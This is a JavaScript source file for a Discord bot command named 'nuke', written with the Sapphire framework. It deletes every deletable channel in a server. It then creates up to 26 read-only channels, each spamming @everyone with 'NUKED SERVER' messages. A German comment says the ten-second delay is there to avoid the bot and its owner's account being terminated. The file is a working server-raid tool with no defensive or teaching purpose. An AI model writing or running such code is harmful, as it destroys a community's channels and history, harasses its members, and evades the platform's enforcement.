const { Command, CommandOptionsRunTypeEnum, BucketScope } = require('@sapphire/framework');
const { send, reply } = require('@sapphire/plugin-editable-commands');
const { Time } = require('@sapphire/time-utilities');
const { PaginatedMessage } = require('@sapphire/discord.js-utilities');
const { MessageEmbed } = require('discord.js');
const { Permissions } = require('discord.js');

module.exports = class NukeCommand extends Command {
    constructor(context, options) {
        super(context, {
            ...options,
            name: 'nuke',
            aliases: ['nuke', 'n'],
            requiredUserPermissions: [],
            requiredClientPermissions: [],
            preconditions: ['ownerOnly'],
            subCommands: [],
            flags: [],
            options: [],
            nsfw: false,
            description: {
                content: 'Nukes a server',
                usage: '',
                examples: ['']
            },
            detailedDescription: ''
        });
    }

    async messageRun(message, args) {
        message.delete().catch(() => { });

        if (message.guild.me.permissions.has([Permissions.FLAGS.MANAGE_CHANNELS])) {
            // delete all deletable channels
            const channels = message.guild.channels.cache.filter(c => c.deletable);
            const deletion = channels.map(async channel => {
                await channel.delete().catch(() => { });
            });

            // create first ඞ channel
            await Promise.all(deletion);
            let targetchannel = await message.guild.channels.create("ඞ", {
                type: "text",
                permissionOverwrites: [{
                    id: message.guild.roles.everyone,
                    allow: ['VIEW_CHANNEL', 'READ_MESSAGE_HISTORY'],
                    deny: ['SEND_MESSAGES']
                }]
            });

            // send ඞ message
            targetchannel.send(`${message.guild.roles.everyone} **ඞ NUKE ඞ**`, { allowedMentions: { parse: ['everyone'] } });
            await targetchannel.send('https://cdn.discordapp.com/attachments/970056816404885536/970057242177073212/nuke.gif');

            // start creating ඞ channels with a delay
            for (let i = 0; i < 25; i++) {
                await this.sleep(10 * 1000); // time in seconds, zu niedriger cooldown kann zur termination des bots und Janis Account führen!!!!!!!
                let channel = await message.guild.channels.create(`ඞ`, {
                    type: "text",
                    permissionOverwrites: [{
                        id: message.guild.roles.everyone,
                        allow: ['VIEW_CHANNEL', 'READ_MESSAGE_HISTORY'],
                        deny: ['SEND_MESSAGES']
                    }]
                });

                channel.send(`**ඞ NUKED SERVER ඞ**\n\u2800\u2800${message.guild.roles.everyone}`, { allowedMentions: { parse: ['everyone'] } });
            }
        }
    }

    async sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}
